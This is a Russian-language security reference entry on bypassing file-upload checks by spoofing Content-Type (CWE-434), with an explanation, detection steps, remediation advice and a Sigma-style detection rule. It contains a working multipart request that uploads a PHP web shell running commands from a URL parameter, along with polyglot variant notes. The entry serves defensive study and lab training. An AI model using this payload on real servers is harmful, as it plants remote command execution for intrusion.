---
id: upload-mime-content-type-spoof
title: "Загрузка файлов: подмена Content-Type вместо проверки содержимого"
type: upload
target: http
category: web
difficulty: beginner
bypass: filter
tags: [file-upload, mime, magic-bytes, validation]
tested_on: ["PHP move_uploaded_file", "Node multer", "Spring MultipartFile"]
success_rate: 0.7
risk: high
cwe: "CWE-434"
lab: "labs/web-labs/upload-lab"
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "file-upload"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "xxe"
    type: related_to
    description: "Office/SVG-контейнеры — тот же класс «файл как вектор»"
---

# Загрузка файлов: подмена Content-Type вместо проверки содержимого

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="avatar.php"
Content-Type: image/png

<?php system($_GET['c']); ?>
--X--
```

## Explanation

Многие приложения проверяют тип файла по заголовку `Content-Type` части
multipart-запроса. Это значение **полностью контролируется клиентом**:
достаточно написать `image/png` при любом содержимом. Проверка проходит,
а на диск ложится PHP-код.

Вторая половина проблемы — расширение: если имя файла берётся из `filename=`
без нормализации, то вместе с подменённым MIME получаем исполняемый файл
в веб-доступном каталоге.

Правильная проверка содержимого — это не «посмотреть Content-Type»,
а сверить magic bytes и, для изображений, пересобрать файл декодером
(что уничтожает вставленный после EOF код).

## Detection

1. Загрузите файл с кодом, но `Content-Type: image/png` — принят ли?
2. Загрузите реальный PNG с дописанным после `IEND` PHP-кодом (polyglot) —
   принимается и исполняется?
3. Проверьте, читает ли сервер magic bytes (ответ меняется при подмене первых байт).
4. В коде ищите `$_FILES['x']['type']`, `file.mimetype`, `getContentType()` —
   это клиентские значения.

## Remediation

- Определять тип по содержимому: `finfo_file()` (PHP), `file`-magic (Linux),
  библиотеки определения MIME по сигнатурам; не доверять `Content-Type` клиента.
- Пересобирать изображения (GD/Imagick, `sharp`) — убирает скрытый код.
- Whitelist расширений + переименование + хранение вне веб-корня.
- Отключить исполнение скриптов в каталоге загрузок.
- Для Office/PDF: конвертация в безопасный формат или санитизация
  (удаление макросов, внешних ссылок, JS в PDF).
- Сканирование антивирусом и лимиты размера.

## Variants

```
Content-Type: image/jpeg + shell.php
```

```
PNG polyglot с PHP после IEND
```

## Detection rules

```yaml
title: Подмена Content-Type — скриптовое расширение с типом изображения
id: e5f6a7b8-0058-4e5f-9a7b-000000000058
status: experimental
description: >-
  Имя файла заканчивается на исполняемое расширение (.php, .jsp, .aspx...),
  а заявленный Content-Type — image/* или application/octet-stream. Расхождение
  «расширение vs MIME vs фактические байты» — признак обхода валидации загрузок.
references:
  - https://attack.mitre.org/techniques/T1190/
logsource:
  category: application
  definition: 'логи загрузок с именем файла и Content-Type из multipart'
detection:
  upload:
    event_action: file_upload
  script_extension:
    filename|endswith:
      - '.php'
      - '.phtml'
      - '.php5'
      - '.jsp'
      - '.jspx'
      - '.aspx'
      - '.asp'
      - '.cgi'
      - '.pl'
  non_script_type:
    content_type|contains:
      - 'image/'
      - 'text/plain'
      - 'application/octet-stream'
      - 'video/'
  condition: upload and script_extension and non_script_type
fields:
  - source_ip
  - filename
  - content_type
falsepositives:
  - загрузка исходников (.php как текст) в системах разработки — исключайте по request_path
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.434
```
